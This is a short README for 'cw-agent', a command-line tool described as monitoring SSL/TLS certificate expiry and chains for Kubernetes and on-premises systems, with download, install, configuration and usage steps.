# 🌐 cw-agent - Monitor SSL/TLS Certificates Easily

## 🚀 Getting Started

Welcome to cw-agent! This tool helps you monitor SSL/TLS certificates for your Kubernetes and on-premises infrastructure. You can quickly scan certificates, detect expiration, validate chains, and sync data to the CertWatch cloud. 

## 📥 Download the Latest Version

[![Download cw-agent](https://img.shields.io/badge/Download-cw--agent-blue.svg)](https://github.com/Ok2038/cw-agent/releases)

Visit this page to download: [GitHub Releases](https://github.com/Ok2038/cw-agent/releases)

## 📋 System Requirements

To use cw-agent, your system should meet the following requirements:

- **Operating System**: Linux, macOS, or Windows 
- **Dependencies**: Ensure you have Docker installed (if using on Kubernetes) 
- **Memory**: At least 512 MB of RAM 
- **Disk Space**: Minimum 100 MB available 

## 📥 Download & Install

1. Visit this page to download: [GitHub Releases](https://github.com/Ok2038/cw-agent/releases).
2. Look for the latest release at the top of the page. It usually has the highest version number.
3. Click on the download link for your operating system. 
4. Once the download is complete, find the file in your downloads folder.

### Installing cw-agent

- **For Windows**: 
  - Double-click the downloaded `.exe` file. 
  - Follow the on-screen instructions.
  
- **For macOS**: 
  - Open the terminal.
  - Navigate to the folder where the file downloaded.
  - Run `chmod +x cw-agent`, then `./cw-agent` to start.

- **For Linux**: 
  - Open the terminal.
  - Navigate to the folder where the file downloaded.
  - Run `chmod +x cw-agent`, then `./cw-agent` to start.

## ⚙️ Configuration

After installing cw-agent, you will need to configure it to start monitoring your certificates.

1. **Configuration File**: Find the `config.yaml` file in the cw-agent directory.
2. **Edit the Configuration**: Open `config.yaml` with a text editor. You can specify the domains and certificates you wish to monitor.
3. **Start the Agent**: Run the command `./cw-agent start` in your terminal or command prompt to begin monitoring.

## 🔍 How to Use

Once cw-agent is running, you can:

- **Scan Certificates**: The tool will automatically scan designated certificates.
- **Check Expiration**: cw-agent will alert you if any certificates are nearing expiration.
- **Validate Chains**: Ensure your certificates are valid and correctly installed.
- **Sync to CertWatch**: Send status updates to CertWatch for easy tracking.

To view logs, either check the logs directory or use the command `./cw-agent logs`.

## 💬 Support

If you have questions or need assistance, please create an issue in our [GitHub repository](https://github.com/Ok2038/cw-agent/issues).

## 🛠️ Contributing

We welcome contributions! If you're interested in improving cw-agent, feel free to fork the repository and submit a pull request.

## 🌍 Topics

- certificate
- cli
- cloud-native
- devops
- golang
- kubernetes
- monitoring
- security
- sre
- ssl
- tls

## 🚀 More Information

For further details on features and usage, refer to the documentation available in the repository. Happy monitoring!